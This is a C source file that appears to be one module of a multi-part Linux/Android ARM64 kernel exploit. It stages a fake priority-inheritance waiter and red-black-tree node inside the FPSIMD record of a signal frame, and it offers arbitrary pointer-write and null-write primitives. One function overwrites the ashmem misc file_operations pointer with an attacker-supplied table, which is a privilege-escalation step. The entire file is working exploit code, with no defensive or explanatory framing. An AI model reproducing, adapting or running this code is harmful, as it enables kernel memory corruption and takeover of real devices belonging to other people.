/*
 * Constructs the PI-waiter data carried in an ARM signal frame. A SIGUSR1
 * handler locates the FPSIMD record and copies the prepared bytes into it.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/ucontext.h>
#include <unistd.h>

#include "04_fake_kernel_objects.h"
#include "06_signal_frame_payload.h"
#include "target.h"

static unsigned char g_payload[TARGET_SIGNAL_PAYLOAD_SIZE];
static atomic_int g_handler_result; /* 0=not run yet, 1=success, -1=failed */
static atomic_int g_handler_reason;

enum sigusr1_handler_reason {
  SIGUSR1_REASON_NOT_DELIVERED = 0,
  SIGUSR1_REASON_INVALID_SIZE_OR_ALIGNMENT = 1,
  SIGUSR1_REASON_RECORD_OUT_OF_BOUNDS = 2,
  SIGUSR1_REASON_FPSIMD_MISSING = 3,
  SIGUSR1_REASON_SUCCESS = 4,
  SIGUSR1_REASON_TGKILL_FAILED = 5,
};

static void put64(unsigned char *base, size_t off, uint64_t value) {
  memcpy(base + off, &value, sizeof(value));
}

static void sigusr1_build_rb_payload(uint64_t page_base, uint64_t parent,
                                     uint64_t right) {
  memset(g_payload, 0, sizeof(g_payload));
  uint64_t pi_waiters_self_ref =
      page_base | TARGET_PI_WAITERS_SELF_LIVE_OFF;
  uint64_t signal_scratch = page_base | TARGET_SIGNAL_SCRATCH_LIVE_OFF;
  uint64_t waiter_lock = page_base | TARGET_WAITER_LOCK_LIVE_OFF;

  put64(g_payload, TARGET_SIGNAL_RB_PARENT_OFF, parent);
  put64(g_payload, TARGET_SIGNAL_RB_RIGHT_OFF, right);
  put64(g_payload, TARGET_SIGNAL_RB_LEFT_OFF, 0);
  put64(g_payload, TARGET_SIGNAL_PI_WAITERS_OFF, pi_waiters_self_ref);
  put64(g_payload, TARGET_SIGNAL_ZERO_0_OFF, 0);
  put64(g_payload, TARGET_SIGNAL_ZERO_1_OFF, 0);
  put64(g_payload, TARGET_SIGNAL_SCRATCH_PTR_OFF, signal_scratch);
  put64(g_payload, TARGET_SIGNAL_WAITER_LOCK_OFF, waiter_lock);
  put64(g_payload, TARGET_SIGNAL_RB_TAG_OFF, TARGET_SIGNAL_RB_TAG);
  put64(g_payload, TARGET_SIGNAL_ZERO_2_OFF, 0);
  put64(g_payload, TARGET_SIGNAL_ZERO_3_OFF, 0);
}

void sigusr1_build_pointer_write_payload(uint64_t page_base,
                                         uint64_t target_addr,
                                         uint64_t replacement_addr) {
  sigusr1_build_rb_payload(page_base, replacement_addr, target_addr);
}

void sigusr1_build_null_write_payload(uint64_t page_base,
                                      uint64_t target_addr) {
  sigusr1_build_rb_payload(page_base, target_addr - 8, 0);
}

void sigusr1_build_payload(uint64_t page_base, uint64_t ashmem_misc_fops_addr) {
  sigusr1_build_pointer_write_payload(
      page_base, ashmem_misc_fops_addr,
      page_base | TARGET_PRIMARY_FOPS_LIVE_OFF);
}

static void sigusr1_handler(int sig, siginfo_t *info, void *ucontext_v) {
  (void)sig;
  (void)info;
  ucontext_t *uc = (ucontext_t *)ucontext_v;
  unsigned char *base = uc->uc_mcontext.__reserved;
  size_t limit = sizeof(uc->uc_mcontext.__reserved);
  size_t offset = 0;
  struct fpsimd_context *fpsimd = NULL;

  while (offset + sizeof(struct _aarch64_ctx) <= limit) {
    struct _aarch64_ctx *head = (struct _aarch64_ctx *)(base + offset);
    uint32_t magic = head->magic;
    uint32_t size = head->size;

    if (magic == 0 && size == 0) {
      break; /* end of the record list, real kernel uses the same sentinel */
    }
    if (size < sizeof(struct _aarch64_ctx) || (size & 0xf) != 0) {
      atomic_store(&g_handler_reason,
                   SIGUSR1_REASON_INVALID_SIZE_OR_ALIGNMENT);
      atomic_store(&g_handler_result, -1);
      return;
    }
    if (offset + size > limit) {
      atomic_store(&g_handler_reason, SIGUSR1_REASON_RECORD_OUT_OF_BOUNDS);
      atomic_store(&g_handler_result, -1);
      return;
    }
    if (magic == FPSIMD_MAGIC && size == sizeof(struct fpsimd_context)) {
      fpsimd = (struct fpsimd_context *)head;
    }
    offset += size;
  }
  if (fpsimd == NULL) {
    atomic_store(&g_handler_reason, SIGUSR1_REASON_FPSIMD_MISSING);
    atomic_store(&g_handler_result, -1);
    return;
  }

  volatile unsigned char *dst = (volatile unsigned char *)fpsimd->vregs;
  volatile const unsigned char *src =
      (volatile const unsigned char *)g_payload;
  for (size_t i = 0; i < sizeof(g_payload); i++) {
    dst[i] = src[i];
  }
  atomic_store(&g_handler_reason, SIGUSR1_REASON_SUCCESS);
  atomic_store(&g_handler_result, 1);
}

int sigusr1_install_handler(void) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = sigusr1_handler;
  sa.sa_flags = SA_SIGINFO | SA_RESTART;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR1, &sa, NULL) != 0) {
    fprintf(stderr, "[sigusr1] sigaction failed errno=%d\n", errno);
    return 0;
  }
  return 1;
}

int sigusr1_fire_and_wait(void) {
  atomic_store(&g_handler_result, 0);
  atomic_store(&g_handler_reason, SIGUSR1_REASON_NOT_DELIVERED);

  pid_t pid = getpid();
  long tid = syscall(SYS_gettid);
  long ret = syscall(SYS_tgkill, pid, tid, SIGUSR1);
  if (ret != 0) {
    atomic_store(&g_handler_reason, SIGUSR1_REASON_TGKILL_FAILED);
    fprintf(stderr, "[sigusr1] tgkill failed errno=%d\n", errno);
    return 0;
  }

  return atomic_load(&g_handler_result) == 1;
}

int sigusr1_last_handler_result(void) {
  return atomic_load(&g_handler_result);
}

int sigusr1_last_handler_reason(void) {
  return atomic_load(&g_handler_reason);
}

const char *sigusr1_handler_reason_name(int reason) {
  switch (reason) {
    case SIGUSR1_REASON_NOT_DELIVERED:
      return "not-delivered";
    case SIGUSR1_REASON_INVALID_SIZE_OR_ALIGNMENT:
      return "invalid-size-or-alignment";
    case SIGUSR1_REASON_RECORD_OUT_OF_BOUNDS:
      return "record-out-of-bounds";
    case SIGUSR1_REASON_FPSIMD_MISSING:
      return "fpsimd-missing";
    case SIGUSR1_REASON_SUCCESS:
      return "success";
    case SIGUSR1_REASON_TGKILL_FAILED:
      return "tgkill-failed";
    default:
      return "unknown";
  }
}
